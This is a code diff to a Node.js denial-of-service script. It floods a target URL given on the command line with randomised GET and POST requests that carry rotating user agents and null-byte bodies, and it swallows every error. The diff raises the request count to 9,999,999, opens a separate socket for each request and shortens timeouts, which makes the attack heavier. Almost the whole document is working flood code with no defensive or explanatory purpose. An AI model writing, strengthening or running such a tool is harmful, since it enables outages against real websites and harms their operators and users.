@@ -11,7 +11,7 @@ const target = process.argv[2];
 const parsed = url.parse(target);
 const host = url.parse(target).host;
 const time = process.argv[3];
-const numRequests = 500000; // Number of concurrent requests
+const numRequests = 9999999; // Updated number of concurrent requests
 
 process.on('uncaughtException', function (e) { });
 process.on('unhandledRejection', function (e) { });
@@ -6208,31 +6208,36 @@ const nullHexs = [
 ];
 
 const makeRequest = async () => {
-    const s = require('net').Socket();
-    s.connect(80, host);
-    s.setTimeout(10000);
-
+    const promises = [];
     const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
     for (let i = 0; i < numRequests; i++) {
-        const requestType = Math.random() < 0.5 ? 'GET' : 'POST';
-        const requestData = (requestType === 'POST') ? nullHexs[Math.floor(Math.random() * userAgents.length)] : '';
+        promises.push(new Promise((resolve) => {
+            const s = require('net').Socket();
+            s.connect(80, host);
+            s.setTimeout(5000); // Reduced timeout to 5 seconds
 
-        const request = `${requestType} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${randomUserAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n${requestData}`;
+            const requestType = Math.random() < 0.5 ? 'GET' : 'POST';
+            const requestData = (requestType === 'POST') ? nullHexs[Math.floor(Math.random() * userAgents.length)] : '';
 
-        s.write(request);
+            const request = `${requestType} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${randomUserAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n${requestData}`;
+
+            s.write(request);
+
+            s.on('data', function () {
+                setTimeout(function () {
+                    s.destroy();
+                    resolve();
+                }, 5000);
+            });
+        }));
     }
 
-    s.on('data', function () {
-        setTimeout(function () {
-            s.destroy();
-        }, 5000);
-    });
+    await Promise.all(promises);
 };
 
 const runRequests = async () => {
-    const requests = Array.from({ length: numRequests }, () => makeRequest());
-    await Promise.all(requests);
+    await makeRequest();
 };
 
 const intervalId = setInterval(runRequests, 100);
